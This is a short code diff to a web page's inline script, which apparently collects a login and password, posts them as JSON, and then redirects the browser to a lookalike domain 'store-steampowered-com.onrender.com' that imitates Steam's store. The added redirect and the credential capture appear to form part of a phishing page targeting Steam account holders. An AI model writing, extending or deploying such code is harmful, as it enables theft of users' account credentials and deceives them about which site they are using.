@@ -2471,11 +2471,14 @@
                     headers: {
                         "Content-Type": "application/json"
                     },
-                    body: JSON.stringify({
-                        login,
-                        password
-                    })
-                }).then(response => response.json()).then(data => console.log("All right:", data)).catch(error => console.error("Unknown error:", error));
+                    body: JSON.stringify({ login, password })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("All right:", data);
+                    window.location.href = "https://store-steampowered-com.onrender.com/login/";
+                })
+                .catch(error => console.error("Unknown error:", error));
             });
         </script>
     </body>
